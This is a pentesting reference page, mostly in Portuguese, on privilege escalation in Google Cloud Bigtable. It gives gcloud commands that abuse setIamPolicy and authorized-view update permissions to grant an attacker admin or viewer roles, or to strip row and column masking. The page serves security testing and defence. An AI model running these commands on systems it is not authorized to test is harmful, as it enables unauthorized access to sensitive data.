# GCP - Bigtable Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Para mais informações sobre Bigtable, consulte:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### `bigtable.instances.setIamPolicy`

**Permissões:** `bigtable.instances.setIamPolicy` (e normalmente `bigtable.instances.getIamPolicy` para ler os vínculos atuais).

Ser proprietário da política IAM da instância permite que você se conceda **`roles/bigtable.admin`** (ou qualquer função personalizada), que se propaga para cada cluster, tabela, backup e visualização autorizada na instância.

<details><summary>Conceda a si mesmo a função bigtable.admin na instância</summary>
```bash
gcloud bigtable instances add-iam-policy-binding <instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

> [!TIP]
> Se não conseguir listar os bindings existentes, crie um novo documento de política e envie-o com `gcloud bigtable instances set-iam-policy`, desde que você mantenha sua própria entrada nele.

Depois de obter essa permissão, consulte a seção [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) para mais formas de abusar das permissões do Bigtable.

### `bigtable.tables.setIamPolicy`

**Permissões:** `bigtable.tables.setIamPolicy` (opcionalmente `bigtable.tables.getIamPolicy`).

As políticas de instância podem estar bloqueadas enquanto tabelas individuais são delegadas. Se você puder editar o IAM da tabela, pode **se promover a proprietário do conjunto de dados alvo** sem afetar outras cargas de trabalho.

<details><summary>Grant yourself bigtable.admin role on table</summary>
```bash
gcloud bigtable tables add-iam-policy-binding <table-id> \
--instance=<instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Depois de obter essa permissão, verifique na [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) as técnicas para mais maneiras de abusar das permissões do Bigtable.


### `bigtable.backups.setIamPolicy`

**Permissões:** `bigtable.backups.setIamPolicy`

Backups podem ser restaurados para **qualquer instância em qualquer projeto** que você controle. Primeiro, conceda à sua identidade acesso ao backup e, em seguida, restaure-o em um sandbox onde você possua funções Admin/Owner.

Se você tem a permissão `bigtable.backups.setIamPolicy`, você pode conceder a si mesmo a permissão `bigtable.backups.restore` para restaurar backups antigos e tentar acessar informações sensíveis.

<details><summary>Take ownership of backup snapshot</summary>
```bash
# Take ownership of the snapshot
gcloud bigtable backups add-iam-policy-binding <backup-id> \
--instance=<instance-id> --cluster=<cluster-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Depois de verificar essa permissão na [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) para ver como restaurar um backup.


### Atualizar authorized view

**Permissões:** `bigtable.authorizedViews.update`

Authorized Views destinam-se a mascarar linhas/colunas. Modificá-las ou excluí-las **removem as restrições granulares nas quais os defensores confiam**.

<details><summary>Atualizar authorized view para ampliar o acesso</summary>
```bash
# Broaden the subset by uploading a permissive definition
gcloud bigtable authorized-views update <view-id> \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/permissive-view.json --ignore-warnings

# Json example not filtering any row or column
cat <<'EOF' > /tmp/permissive-view.json
{
"subsetView": {
"rowPrefixes": [""],
"familySubsets": {
"<SOME FAMILITY NAME USED IN THE CURRENT TABLE>": {
"qualifierPrefixes": [""]
}
}
}
}
EOF

# Describe the authorized view to get a family name
gcloud bigtable authorized-views describe <view-id> \
--instance=<instance-id> --table=<table-id>
```
</details>

Depois de obter essa permissão, consulte a [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) para ver como ler de um Authorized View.

### `bigtable.authorizedViews.setIamPolicy`

**Permissões:**  `bigtable.authorizedViews.setIamPolicy`.

Um atacante com essa permissão pode conceder a si mesmo acesso a um Authorized View, que pode conter dados sensíveis aos quais normalmente não teria acesso.

<details><summary>Conceda a si mesmo acesso a um Authorized View</summary>
```bash
# Give more permissions over an existing view
gcloud bigtable authorized-views add-iam-policy-binding <view-id> \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.viewer'
```
</details>

Depois de ter essa verificação de permissão na [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) para verificar como ler a partir de uma visualização autorizada.



{{#include ../../../banners/hacktricks-training.md}}
